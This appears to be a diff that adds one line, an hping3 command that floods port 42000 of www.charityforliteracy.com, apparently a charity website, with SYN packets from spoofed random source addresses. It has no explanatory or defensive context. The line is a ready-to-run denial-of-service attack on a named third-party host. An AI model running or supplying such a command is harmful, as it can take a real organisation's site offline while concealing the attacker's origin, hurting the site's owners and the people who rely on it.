@@ -1,0 +1,2 @@
+sudo hping3 --count 15000 --data 120 --syn --win 64 -p 42000 --flood --rand-source www.charityforliteracy.com
+
